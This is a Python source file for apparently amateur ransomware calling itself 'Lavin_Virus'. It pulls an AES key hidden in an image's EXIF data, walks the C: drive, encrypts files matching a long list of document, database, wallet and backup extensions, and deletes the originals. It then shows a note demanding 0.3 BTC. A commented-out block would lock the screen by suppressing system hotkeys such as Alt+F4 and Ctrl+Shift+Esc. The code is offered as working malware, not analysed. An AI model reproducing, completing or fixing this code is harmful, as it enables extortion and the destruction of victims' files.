from tkinter import *
from tkinter import font
import os
import keyboard
import numpy as np
from multiprocessing import Pool 
import pyAesCrypt
from stegano import exifHeader

part_one = ['113', '1cd', '3dm', '3ds', '3fr', '3g2', '3gp', '3pr', '73b',
    '7z', 'a3d', 'ab4', 'abf', 'abk', 'ac2', 'accdb', 'accde', 'accdr', 'accdt',
  'acr', 'adb', 'aep', 'agd1', 'ach', 'ai', 'ait', 'al', 'apj', 'apk', 'ark',
  'arw', 'as4', 'asf', 'asm', 'asp', 'asset', 'asvx', 'asx', 'ate', 'ati',
  'avi', 'awg', 'azw', 'azw4', 'b1', 'bac', 'back', 'backup', 'backupdb', 'bak',
  'bakx', 'bar', 'bay', 'bb', 'bc6', 'bc7', 'bck', 'bcm', 'bdb', 'bgt', 'big', 'bik',
  ]
part_two = ['dotm', 'dotx', 'drf', 'drw', 'dt', 'dta', 'dtaus', 'dtd', 'dwfx', 'dwg', 'dxb', 'dxf', 'dxg',
  'edi', 'eml', 'emlx', 'epk', 'eps', 'epub', 'erbsql', 'erf', 'esm', 'exf', 'fb2', 'fbf', 'fbk', 'fbw', 'fbx',
  'fdb', 'ffd', 'fff', 'fh', 'fhd', 'fla', 'flac', 'flv', 'forge', 'fos', 'fpk', 'fpx', 'fsh', 'fxg', 
  'gbk', 'gdb', 'gho', 'gif', 'gpx', 'gray', 'grey', 'gros', 'gry', 'h', 'hbk', 'hkdb', 'hkx', 'hplg', 
  'hpp', 'htm', 'html', 'hvpl', 'hxi', 'hxq', 'hxr', 'hxs', 'hxw', 'chi', 'chm', 'chq', 'chw', 'ibank', 
  ]
part_three= ['nef', 'netcdf', 'nk2', 'nop', 'nrw', 'ns2', 'ns3', 'ns4', 'nsd', 'nsf', 'nsg', 'nsh', 'ntl', 'nwb', 'nx1', 'nx2', 'nyf', 'oab', 'obj', 'odb', 
  'odc', 'odf', 'odg', 'odm', 'odp', 'ods', 'odt', 'orf', 'ost', 'otg', 'oth', 'otp', 'ots', 'ott', 
  'p12', 'p7b', 'p7c', 'pab', 'pak', 'pas', 'pat', 'pcd', 'pct', 'pdb', 'pdb', 'pdd', 'pdf', 'pef', 'pem', 'pfx', 'php', 'pkpass', 'pl', 'png', 'pot', 
  'potm', 'potx', 'ppam', 'pps', 'ppsm', 'ppsx', 'ppt', 'pptm', 'pptx', 'prf', 'prproj', 'ps', 
  'psafe3', 'psd', 'psk', 'pst', 'ptx', 'pub', 'pwm', 'py', 'pz3', 'qba', 'qbb', 'qbm', 'qbo', 'qbr', 'qbw', 'qbx', 'qby', 
  'qdf', 'qfx', 'qic', 'qif', 'qt', 'qvw', 's3db', 'sav', 'sb', 'sbs', 'sd0', 'sd1', 'sda', 'sdf', 'sdxf', 
  'shtm', 'shtml', 'sid', 'sidd', 'sidn', 'sie', 'sis', 'sldasm', 'sldm', 'sldprt', 'sldx', 'slm', 'sln', 
  ]
part_five = ['bkf', 'bkp', 'blend', 'blob', 'bpw', 'bsa', 'c', 'cab', 'cas', 'cb7', 'cbr',
  'cbt', 'ccd', 'cdf', 'cdr', 'cdr3', 'cdr4', 'cdr5', 'cdr6', 'cdrw', 'cdx', 'ce1', 'ce2',
  'cer', 'cf', 'cfp', 'cfr', 'cgm', 'cib', 'cls', 'cmt', 'con', 'cpi', 'cpp', 'cpt', 'cr2',
  'craw', 'crt', 'crw', 'cs', 'csh', 'csl', 'css', 'csv', 'ctb', 'd3dbsp', 'dac', 'das', 'dat', 
  'data', 'db', 'db0', 'db3', 'dba', 'dbf', 'dc2', 'dc3', 'dcr', 'dcs', 'ddrw', 'dds', 'der', 
  'des', 'desc', 'design', 'dgb', 'dgc', 'dicom', 'divx', 'djvu', 'dmg', 'dmp', 'dng', 'doc', 'docm', 
  'docx', 'dot']
part_six = ['ibd', 'ibz', 'icxs', 'idx', 'iff', 'img', 'inc', 'incpas', 'iso', 'itdb', 'itl', 'itm', 'iv2i', 'iwd', 
  'iwi', 'jar', 'java', 'jpe', 'jpeg', 'jpg', 'js', 'kc2', 'kdb', 'kdbx', 'kdc', 'key', 'keystore', 'keystore', 
  'kf', 'kpdx', 'layout', 'lbf', 'ldf', 'lic', 'lit', 'litemod', 'lrf', 'ltx', 'lua', 'lvl', 'm', 'm2', 'm2v', 
  'm3d', 'm3u', 'm4a', 'm4v', 'map', 'max', 'mcmeta', 'mdb', 'mdbackup', 'mdc', 'mddata', 'mdf', 'mds', 'mef', 
  'menu', 'mfw', 'mkv', 'mlx', 'mmw', 'mobi', 'model', 'moneywell', 'mos', 'mov', 'mp3', 'mp4', 'mpeg-1', 'mpeg-2', 
  'mpeg-4', 'mpg',  'mpq', 'mpqge', 'mrw', 'mrwref', 'msg', 'myd', 'nbd', 'ncf', 'nd', 'ndd']
part_seven = ['sn1', 'sna', 'snx', 'spf', 'sql', 'sqlite', 'sqlite3', 'sqlitedb', 'sr2', 'srf', 'srt', 'srw', 'st4', 'st5', 
  'st6', 'st7', 'st8', 'stc', 'std', 'sti', 'stw', 'stx', 'sub', 'sum', 'suo', 'svg', 'swf', 'swm', 'sxc', 'sxd', 
  'sxg', 'sxi', 'sxm', 'sxw', 't12', 't13', 'tar', 'tax', 'tbl', 'tex', 'tga', 'tib', 'tis', 'tlg', 'trn', 'txt', 
  'upk', 'vcf', 'vdf', 'vfs0', 'vob', 'vob', 'vpk', 'vpp_pc', 'vtf', 'w3x', 'wab', 'wallet', 'wav', 'wbb', 'wbcat', 
  'wdb', 'wif', 'wim', 'win', 'wma', 'wmo', 'wmv', 'wpd', 'wps', 'x3f', 'xar', 'xf', 'xla', 'xlam', 'xlk', 'xll', 
  'xlm', 'xlr', 'xls', 'xlsb', 'xlsk', 'xlsm', 'xlsx', 'xlt', 'xltm', 'xltx', 'xlw', 'xmi', 'xml', 'ycbcra', 'yuv', 
  'z', 'zip', 'ztmp']


def Encrypt(part):
    buff = 512*1024
    global res
    n_part = np.array(part, str)
    for address, dirs, files in os.walk("C:\\",topdown=True):
        for file in files:
            if file.split('.')[-1] in n_part:
                pyAesCrypt.encryptFile(file, file+'.lol', res,buff)
                os.remove(file)

def Decrypt():
    buff = 512*1024
    global res
    for addresess , dirs, files in os.walk('C:\\', topdown=True):
        for file in files:
            if file.split('.')[-1] == 'lol':
                pyAesCrypt.decryptFile(file, file[:-3], res, buff)
                os.remove(file)



if __name__ == "__main__":
    #root = Tk()
    # Adjust size
    try:
      res = exifHeader.reveal("WAIIPAPER.jpg").decode()
    except Exception:
      pass
    else:
      text = " hi, this is Lavin_Virus,\n ur files are encrypted.\n If u wanna descript ur file u should pay 0.3 BTC on wallet(___________)\n and send receipt on this emal(___________)\n Next u will get a key.\n I don't recommend to close this program, i have studied how to code and i don't sure that all will work right) "
      #root.attributes("-fullscreen", True)
      #root.protocol("WM_DELETE_WINDOW", root.iconify)
      ''' root.configure(bg="black")
      label = Label(root, text=text, fg="red", bg="black", font=("Old English Text MT", 20))
      label.place(relx=0.5, rely=0.5, anchor='center')
      entry = Entry(root, bg="white")
      entry.place(rely=0.75, relx=0.5, anchor="center")
      button = Button(root, bg="black", fg="White", text="Try", command=Decrypt)
      button.place(relx=0.55, rely=0.75, anchor="c")
      keyboard.add_hotkey("alt + f4", None, suppress=True)
      keyboard.add_hotkey("alt + tab", None, suppress=True)
      keyboard.add_hotkey("win + r", None, suppress=True)
      keyboard.add_hotkey("win + d", None, suppress=True)
      keyboard.add_hotkey("win", None, suppress=True)
      keyboard.add_hotkey("win + g", None, suppress=True)
      keyboard.add_hotkey("ctrl + shift + esc", None, suppress=True)
      keyboard.add_hotkey('ctrl + alt + esc', None)
      '''
      # Execute tkinter
      with Pool(6) as p:
          p.map(Encrypt, [part_one, part_two, part_three, part_five, part_six, part_seven])
      #if entry.get() == res:
      #    with Pool(6) as p:
      #        p.map(Decrypt,)
      #root.mainloop()
    
    